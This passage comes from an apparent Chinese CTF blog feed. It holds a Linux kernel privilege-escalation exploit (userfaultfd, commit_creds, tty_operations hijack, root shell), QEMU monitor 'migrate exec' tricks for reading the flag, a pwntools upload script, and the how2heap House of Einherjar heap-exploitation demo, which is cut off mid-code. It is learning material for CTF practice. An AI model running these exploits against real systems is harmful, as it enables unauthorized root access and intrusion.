class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_api</span> uffdio_api;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_register</span> uffdio_register;<br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = <span class="hljs-built_in">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = <span class="hljs-built_in">pthread_create</span>(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-built_in">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_driver</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">serial_icounter_struct</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_operations</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span> * (*lookup)(<span class="hljs-keyword">struct</span> tty_driver *driver,<br>            <span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">int</span> idx);<br>    <span class="hljs-built_in">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-built_in">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-built_in">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-built_in">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-built_in">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> set, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-built_in">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-built_in">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-built_in">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-built_in">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-built_in">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-built_in">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-built_in">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> *proc_fops;<br>&#125;;<br><br><br><br></code></pre></td></tr></table></figure><h2 id="一些小trick"><a href="#一些小trick" class="headerlink" title="一些小trick"></a>一些小trick</h2><h4 id="没有使用-monitor-x2F-dev-x2F-null将monitor重定向"><a href="#没有使用-monitor-x2F-dev-x2F-null将monitor重定向" class="headerlink" title="没有使用-monitor &#x2F;dev&#x2F;null将monitor重定向"></a>没有使用-monitor &#x2F;dev&#x2F;null将monitor重定向</h4><p>没有使用-monitor &#x2F;dev&#x2F;null将monitor重定向，可以直接进入monitor导出docker中的文件系统</p><p>在启动qemu后点击ctrl+a后再按c即可进入monitor控制台</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">migrate</span> <span class="hljs-string">&quot;exec:cp rootfs.cpio /tmp&quot;</span><br>migrate <span class="hljs-string">&quot;exec:cd /tmp;ls 1&gt;&amp;2&quot;</span><br>migrate <span class="hljs-string">&quot;exec:cd /tmp;cpio -idmv &lt; rootfs.cpio 1&gt;&amp;2&quot;</span><br>migrate <span class="hljs-string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span><br></code></pre></td></tr></table></figure><h4 id="发送exp脚本"><a href="#发送exp脚本" class="headerlink" title="发送exp脚本"></a>发送exp脚本</h4><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>cmd = <span class="hljs-string">&#x27;/ $ &#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./start.sh&#x27;</span>)<br>def exploit(r):<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;stty -echo&#x27;</span>)<br>    #os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;musl-gcc  -static -O2 exp.c -o exp&#x27;</span>)<br>    os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tar -cvf exp.tar.gz exp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cat &lt;&lt;EOF &gt; /tmp/exp.tar.gz.b64&#x27;</span>) #heredoc<br>    r.sendline((read(<span class="hljs-string">&#x27;exp.tar.gz&#x27;</span>)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>    #r.sendline(<span class="hljs-string">&#x27;EOF&#x27;</span>)<br>    # r.recvall()<br>    # r.sendline(<span class="hljs-string">&#x27;cd /tmp/&#x27;</span>)<br>    #r.recv()<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;base64 -d /tmp/exp.tar.gz.b64 &gt; /tmp/exp.tar.gz&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;tar -xvf /tmp/exp.tar.gz -C /tmp/&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;chmod +x /tmp/exp&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;/tmp/exp&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br>    r.interactive()<br><br>exploit(p)<br></code></pre></td></tr></table></figure><p>自己手动填入添加注释的这几条语句，否则有可能会出错。有可能根目录下没有创建新文件的权限，所以最好在&#x2F;tmp&#x2F;目录下创建。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>house_of_einherjar</title>
    <link href="/2022/07/11/house-of-einherjar/"/>
    <url>/2022/07/11/house-of-einherjar/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>本篇同样是跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>来学习。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Credit to st4g3r for publishing this technique</span><br><span class="hljs-comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="hljs-comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* d;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br><span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">// create a fake chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br><span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br>fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br>fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br>   <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br>   <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br><span class="hljs-comment">// Write a fake prev_size to the end of a</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br>   <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br><span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//if we allocate another chunk before we free b we will need to </span><br><span class="hljs-comment">//do two things: </span><br><span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br><span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br><span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br><span class="hljs-comment">//at the location we control. </span><br><span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br><span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span><br><span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br><span class="hljs-comment">//wilderness</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, 